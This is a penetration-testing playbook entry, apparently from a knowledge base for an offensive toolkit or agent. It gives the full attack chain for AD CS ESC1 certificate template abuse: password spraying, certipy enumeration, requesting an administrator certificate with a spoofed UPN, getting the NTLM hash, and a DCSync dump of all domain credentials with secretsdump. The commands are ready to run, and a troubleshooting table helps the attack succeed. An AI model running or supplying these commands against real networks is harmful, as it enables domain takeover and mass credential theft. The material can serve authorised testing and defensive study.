# [2026-03] AD CS ESC1 certificate template abuse → Domain management authority

## Scene classification
Penetration Testing/AD Attack

## Goal overview
Through the ESC1 vulnerability template of AD CS certificate service, the domain management certificate is obtained as a normal domain user, and finally DCSync exports all credentials.

## Complete execution link

1. Obtain a normal domain user credentials (via password spraying)
2. Enumerating AD CS configurations using certipy
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Discovered ESC1 vulnerability template (allows any SAN, low-privilege users to apply)
4. Request a certificate as a domain administrator
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Obtain NTLM Hash using certificate authentication
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync exports all credentials
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| certipy find timeout | LDAP connection is intercepted by firewall | Use -ns parameter to specify DNS | 20min |
| Certificate request rejected | Template requirement Manager Approval | Change to another template that does not require approval | 10min |
| auth failed KDC_ERR_PADATA | DC time is not synchronized | ntpdate Retry after synchronizing time | 5min |

## Toolchain discovery
- certipy is the tool of choice for AD CS attacks, more convenient than Certify.exe (pure Python, Kali runs directly)
- Need to ensure that DNS resolution is correct, otherwise Kerberos authentication will fail

## Key code/command
See execution link above.

## Reusable patterns/script snippets
```bash
# AD CS rapid detection one-stop service
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Suggestions for improvements to this package
- certipy has been added to Kali bootstrap manifest ✓
- routing.md already has "Certipy/AD CS" route ✓

## evolution action
- [x] No update required (covered)

## environmental information
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS deployed
- Domain functional level: 2016
